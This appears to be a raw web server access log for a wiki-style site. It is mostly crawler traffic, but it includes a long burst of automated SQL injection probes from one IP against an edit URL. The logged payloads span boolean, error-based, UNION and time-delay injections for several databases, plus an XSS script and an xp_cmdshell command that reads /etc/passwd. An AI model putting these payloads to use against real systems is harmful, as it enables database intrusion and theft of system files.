194.209.200.2 - - [13/Jun/2022:11:08:00 +0200] "GET /AmiKo/Windows HTTP/1.1" 200 10332 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
54.36.148.82 - - [13/Jun/2022:11:09:42 +0200] "GET /Main/FAZ HTTP/1.1" 200 8325 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
194.209.200.2 - - [13/Jun/2022:11:09:56 +0200] "GET /Main/2006 HTTP/1.1" 200 39320 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:10:20 +0200] "GET /Main/2015 HTTP/1.1" 200 15908 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:10:39 +0200] "GET /AmiKo/IOS HTTP/1.1" 200 11930 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:10:45 +0200] "GET /Ywesee/Kontakt HTTP/1.1" 200 8973 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:10:56 +0200] "GET /Software/Spreadsheet HTTP/1.1" 200 8839 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
89.246.241.14 - - [13/Jun/2022:11:11:43 +0200] "GET /Ywesee/About HTTP/1.1" 200 9132 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"
194.209.200.2 - - [13/Jun/2022:11:12:49 +0200] "GET /Software/ODDB HTTP/1.1" 200 10298 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
89.246.241.14 - - [13/Jun/2022:11:13:04 +0200] "GET /Main/ComCo19122016 HTTP/1.1" 200 10547 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"
179.60.150.123 - - [13/Jun/2022:11:13:18 +0200] "GET /EDMA1/EDMA1?action=edit HTTP/1.1" 200 9293 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
194.209.200.2 - - [13/Jun/2022:11:13:20 +0200] "GET /Ausschreibung/SAI HTTP/1.1" 200 10366 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
179.60.150.123 - - [13/Jun/2022:11:13:44 +0200] "GET /EDMA1/EDMA1?action=edit&CCZm=4460%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 9557 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
194.209.200.2 - - [13/Jun/2022:11:14:00 +0200] "GET /Main/2009 HTTP/1.1" 200 21688 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
179.60.150.123 - - [13/Jun/2022:11:14:05 +0200] "GET /EDMA1/EDMA1?action=edit HTTP/1.1" 200 9293 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
89.246.241.14 - - [13/Jun/2022:11:14:09 +0200] "GET /Software/XMLConv HTTP/1.1" 200 8709 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"
194.209.200.2 - - [13/Jun/2022:11:14:15 +0200] "GET /Software/BBMB HTTP/1.1" 200 9385 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
179.60.150.123 - - [13/Jun/2022:11:14:16 +0200] "GET /EDMA1/EDMA1?action=4529 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:14:33 +0200] "GET /EDMA1/EDMA1?action=edit%2C.%2C%27%2C..%28%22. HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
194.209.200.2 - - [13/Jun/2022:11:14:36 +0200] "GET /Main/2014 HTTP/1.1" 200 19471 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
179.60.150.123 - - [13/Jun/2022:11:14:42 +0200] "GET /EDMA1/EDMA1?action=edit%27fgcgwG%3C%27%22%3EuDWOMA HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
194.209.200.2 - - [13/Jun/2022:11:14:52 +0200] "GET /ODDB/IntegrationLookAmpFeelGenerikasuche HTTP/1.1" 200 9097 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:14:54 +0200] "GET /Main/2010 HTTP/1.1" 200 27997 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:15:00 +0200] "GET /Main/ComCo19122016 HTTP/1.1" 200 10547 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:15:02 +0200] "GET /Eggze/SpreadIt HTTP/1.1" 200 12537 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
179.60.150.123 - - [13/Jun/2022:11:15:03 +0200] "GET /EDMA1/EDMA1?action=edit%27%29%20AND%203723%3D6249%20AND%20%28%27oTId%27%3D%27oTId HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:12 +0200] "GET /EDMA1/EDMA1?action=edit%27%29%20AND%208949%3D8949%20AND%20%28%27CePb%27%3D%27CePb HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:19 +0200] "GET /EDMA1/EDMA1?action=edit%27%20AND%205393%3D2678%20AND%20%27FaVv%27%3D%27FaVv HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:27 +0200] "GET /EDMA1/EDMA1?action=edit%27%20AND%208949%3D8949%20AND%20%27LLxn%27%3D%27LLxn HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:28 +0200] "GET /EDMA1/EDMA1?action=edit%29%20AND%207964%3D3511%20AND%20%288176%3D8176 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:29 +0200] "GET /EDMA1/EDMA1?action=edit%29%20AND%208949%3D8949%20AND%20%283856%3D3856 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:31 +0200] "GET /EDMA1/EDMA1?action=edit%20AND%201973%3D4748 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:34 +0200] "GET /EDMA1/EDMA1?action=edit%20AND%208949%3D8949 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:35 +0200] "GET /EDMA1/EDMA1?action=edit%20AND%204344%3D5660--%20LmHF HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:38 +0200] "GET /EDMA1/EDMA1?action=edit%20AND%208949%3D8949--%20OjYy HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:40 +0200] "GET /EDMA1/EDMA1?action=%28SELECT%20%28CASE%20WHEN%20%282943%3D3049%29%20THEN%20%27edit%27%20ELSE%20%28SELECT%203049%20UNION%20SELECT%205860%29%20END%29%29 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:43 +0200] "GET /EDMA1/EDMA1?action=%28SELECT%20%28CASE%20WHEN%20%282033%3D2033%29%20THEN%20%27edit%27%20ELSE%20%28SELECT%203454%20UNION%20SELECT%208079%29%20END%29%29 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:45 +0200] "GET /EDMA1/EDMA1?action=edit%27%29%20AND%20EXTRACTVALUE%285381%2CCONCAT%280x5c%2C0x716a627171%2C%28SELECT%20%28ELT%285381%3D5381%2C1%29%29%29%2C0x71716b6a71%29%29%20AND%20%28%27VBDE%27%3D%27VBDE HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:47 +0200] "GET /EDMA1/EDMA1?action=edit%27%20AND%20EXTRACTVALUE%285381%2CCONCAT%280x5c%2C0x716a627171%2C%28SELECT%20%28ELT%285381%3D5381%2C1%29%29%29%2C0x71716b6a71%29%29%20AND%20%27HmJk%27%3D%27HmJk HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:48 +0200] "GET /EDMA1/EDMA1?action=edit%29%20AND%20EXTRACTVALUE%285381%2CCONCAT%280x5c%2C0x716a627171%2C%28SELECT%20%28ELT%285381%3D5381%2C1%29%29%29%2C0x71716b6a71%29%29%20AND%20%288683%3D8683 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:49 +0200] "GET /EDMA1/EDMA1?action=edit%20AND%20EXTRACTVALUE%285381%2CCONCAT%280x5c%2C0x716a627171%2C%28SELECT%20%28ELT%285381%3D5381%2C1%29%29%29%2C0x71716b6a71%29%29 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:51 +0200] "GET /EDMA1/EDMA1?action=edit%20AND%20EXTRACTVALUE%285381%2CCONCAT%280x5c%2C0x716a627171%2C%28SELECT%20%28ELT%285381%3D5381%2C1%29%29%29%2C0x71716b6a71%29%29--%20kVhK HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:52 +0200] "GET /EDMA1/EDMA1?action=edit%27%29%20AND%203037%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283037%3D3037%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27kfOt%27%3D%27kfOt HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:54 +0200] "GET /EDMA1/EDMA1?action=edit%27%20AND%203037%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283037%3D3037%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27vpxe%27%3D%27vpxe HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:55 +0200] "GET /EDMA1/EDMA1?action=edit%29%20AND%203037%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283037%3D3037%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%289284%3D9284 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:57 +0200] "GET /EDMA1/EDMA1?action=edit%20AND%203037%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283037%3D3037%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:15:58 +0200] "GET /EDMA1/EDMA1?action=edit%20AND%203037%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283037%3D3037%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20qMbm HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:00 +0200] "GET /EDMA1/EDMA1?action=edit%27%29%20AND%204721%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284721%3D4721%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29%20AND%20%28%27UFBF%27%3D%27UFBF HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:02 +0200] "GET /EDMA1/EDMA1?action=edit%27%20AND%204721%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284721%3D4721%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29%20AND%20%27Vacb%27%3D%27Vacb HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:04 +0200] "GET /EDMA1/EDMA1?action=edit%29%20AND%204721%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284721%3D4721%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29%20AND%20%281057%3D1057 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:05 +0200] "GET /EDMA1/EDMA1?action=edit%20AND%204721%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284721%3D4721%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:07 +0200] "GET /EDMA1/EDMA1?action=edit%20AND%204721%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284721%3D4721%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20ynwY HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:09 +0200] "GET /EDMA1/EDMA1?action=edit%27%29%20AND%202440%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282440%3D2440%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27UtVe%27%3D%27UtVe HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:10 +0200] "GET /EDMA1/EDMA1?action=edit%27%20AND%202440%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282440%3D2440%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27tjkQ%27%3D%27tjkQ HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:12 +0200] "GET /EDMA1/EDMA1?action=edit%29%20AND%202440%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282440%3D2440%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%282166%3D2166 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:14 +0200] "GET /EDMA1/EDMA1?action=edit%20AND%202440%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282440%3D2440%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:15 +0200] "GET /EDMA1/EDMA1?action=edit%20AND%202440%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282440%3D2440%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20sxJh HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:16 +0200] "GET /EDMA1/EDMA1?action=%28SELECT%20CONCAT%28CONCAT%28%27qjbqq%27%2C%28CASE%20WHEN%20%287692%3D7692%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qqkjq%27%29%29 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:18 +0200] "GET /EDMA1/EDMA1?action=edit%27%29%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:19 +0200] "GET /EDMA1/EDMA1?action=edit%27%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:21 +0200] "GET /EDMA1/EDMA1?action=edit%29%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:22 +0200] "GET /EDMA1/EDMA1?action=edit%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:23 +0200] "GET /EDMA1/EDMA1?action=edit%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:24 +0200] "GET /EDMA1/EDMA1?action=edit%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:25 +0200] "GET /EDMA1/EDMA1?action=edit%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:27 +0200] "GET /EDMA1/EDMA1?action=edit%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:28 +0200] "GET /EDMA1/EDMA1?action=edit%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%2883%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
